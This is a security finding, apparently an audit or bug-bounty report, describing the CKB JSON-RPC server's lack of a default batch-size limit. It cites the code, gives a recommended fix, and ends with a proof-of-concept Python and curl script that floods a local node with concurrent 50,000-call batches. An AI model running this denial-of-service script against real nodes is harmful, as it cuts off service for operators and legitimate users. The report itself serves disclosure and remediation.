### Title
RPC Batch Handler Lacks Default Count Limit, Enabling Unbounded CPU/Memory Exhaustion via Oversized Batch Requests — (`rpc/src/server.rs`)

---

### Summary

The CKB JSON-RPC server's batch request handler has no enforced default limit on the number of calls in a single batch. The `rpc_batch_limit` configuration field is `Option<usize>` and defaults to `None`, meaning the limit is only active when an operator explicitly sets it. An unprivileged RPC caller can submit a single HTTP POST containing thousands of RPC calls, forcing the server to process all of them sequentially and exhausting CPU, I/O, and memory resources.

---

### Finding Description

In `rpc/src/server.rs`, the `handle_jsonrpc` function dispatches batch requests:

```rust
static JSONRPC_BATCH_LIMIT: OnceLock<usize> = OnceLock::new();
``` [1](#0-0) 

The limit is only populated when `config.rpc_batch_limit` is `Some`:

```rust
if let Some(jsonrpc_batch_limit) = config.rpc_batch_limit {
    let _ = JSONRPC_BATCH_LIMIT.get_or_init(|| jsonrpc_batch_limit);
}
``` [2](#0-1) 

The batch handler then only enforces the limit when the `OnceLock` is populated:

```rust
Request::Batch(calls) => {
    if let Some(batch_size) = JSONRPC_BATCH_LIMIT.get()
        && calls.len() > *batch_size
    {
        return make_error_response(...);
    }
    // processes ALL calls with no bound otherwise
``` [3](#0-2) 

The `rpc_batch_limit` field is typed as `Option<usize>` with no default value: [4](#0-3) 

The default configuration file explicitly documents this gap:

```toml
# By default there is no limitation on the size of batch request size
# a huge batch request may cost a lot of memory or makes the RPC server slow,
# to avoid this, you may want to add a limit for the batch request size.
# rpc_batch_limit = 2000
``` [5](#0-4) 

The only existing bound is `max_request_body_size = 10485760` (10 MiB). A minimal RPC call such as `{"jsonrpc":"2.0","method":"get_tip_block_number","params":[],"id":1}` is ~60 bytes, allowing roughly **174,000 calls** in a single request. For heavier methods like `get_block` or `get_transaction`, each call involves a RocksDB lookup; 174,000 such calls in one batch can saturate I/O and CPU for the duration of the 30-second `TimeoutLayer` window — and multiple concurrent connections multiply the effect.

---

### Impact Explanation

An attacker (or a misbehaving local process) can send a single oversized batch request that forces the RPC server to process tens of thousands of RPC calls sequentially. This causes:

- **CPU saturation** from JSON parsing, method dispatch, and response serialization for each call.
- **I/O saturation** for database-backed methods (`get_block`, `get_transaction`, `get_cells`, etc.).
- **Memory pressure** from accumulating in-flight futures and response buffers.
- **Degraded availability** for all other RPC clients during the processing window.

Because the streaming response (`StreamBodyAs::json_array`) processes calls one-by-one, the server thread is occupied for the full duration. Multiple concurrent oversized batch connections can fully exhaust the async runtime's capacity.

---

### Likelihood Explanation

The default configuration ships with `rpc_batch_limit` commented out and unset. Any operator who does not explicitly add `rpc_batch_limit` to `ckb.toml` is vulnerable. The RPC is bound to `127.0.0.1` by default, so the primary attacker is a local process or a co-located service. However, operators running public nodes or services that proxy the RPC to external callers are exposed to remote exploitation. The attack requires only a single HTTP POST with a large JSON array — no authentication, no special privileges.

---

### Recommendation

Set a safe, non-optional default for `rpc_batch_limit` in the `Config` struct using `serde(default)`:

```rust
// util/app-config/src/configs/rpc.rs
#[serde(default = "default_rpc_batch_limit")]
pub rpc_batch_limit: usize,  // change from Option<usize>

fn default_rpc_batch_limit() -> usize { 2000 }
```

And update `server.rs` to always enforce it without requiring the `OnceLock` indirection. The existing test `test_rpc_batch_request_limit` already validates the enforcement logic at 1000 calls — a hard default of 2000 (matching the commented-out suggestion in `ckb.toml`) would be a safe starting point.

---

### Proof of Concept

```bash
# Generate a batch of 50,000 get_tip_block_number calls (~3.5 MB, within 10 MiB limit)
python3 -c "
import json, sys
calls = [{'jsonrpc':'2.0','method':'get_tip_block_number','params':[],'id':i} for i in range(50000)]
print(json.dumps(calls))
" > batch.json

# Send to a default CKB node (no rpc_batch_limit configured)
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  --data @batch.json > /dev/null &

# Repeat with multiple concurrent connections to saturate the server
for i in $(seq 1 8); do
  curl -s -X POST http://127.0.0.1:8114 \
    -H 'Content-Type: application/json' \
    --data @batch.json > /dev/null &
done
wait
# Node RPC becomes unresponsive to legitimate callers during processing
```

### Citations

**File:** rpc/src/server.rs (L34-34)
```rust
static JSONRPC_BATCH_LIMIT: OnceLock<usize> = OnceLock::new();
```

**File:** rpc/src/server.rs (L53-55)
```rust
        if let Some(jsonrpc_batch_limit) = config.rpc_batch_limit {
            let _ = JSONRPC_BATCH_LIMIT.get_or_init(|| jsonrpc_batch_limit);
        }
```

**File:** rpc/src/server.rs (L274-296)
```rust
            Request::Batch(calls) => {
                if let Some(batch_size) = JSONRPC_BATCH_LIMIT.get()
                    && calls.len() > *batch_size
                {
                    return make_error_response(jsonrpc_core::Error::invalid_params(format!(
                        "batch size is too large, expect it less than: {}",
                        batch_size
                    )));
                }

                let stream = stream::iter(calls)
                    .then(move |call| {
                        let io = Arc::clone(&io);
                        async move { io.handle_call(call, T::default()).await }
                    })
                    .filter_map(|response| async move { response });

                (
                    [(axum::http::header::CONTENT_TYPE, "application/json")],
                    StreamBodyAs::json_array(stream),
                )
                    .into_response()
            }
```

**File:** util/app-config/src/configs/rpc.rs (L44-44)
```rust
    pub rpc_batch_limit: Option<usize>,
```

**File:** resource/ckb.toml (L205-208)
```text
# By default, there is no limitation on the size of batch request size
# a huge batch request may cost a lot of memory or makes the RPC server slow,
# to avoid this, you may want to add a limit for the batch request size.
# rpc_batch_limit = 2000
```
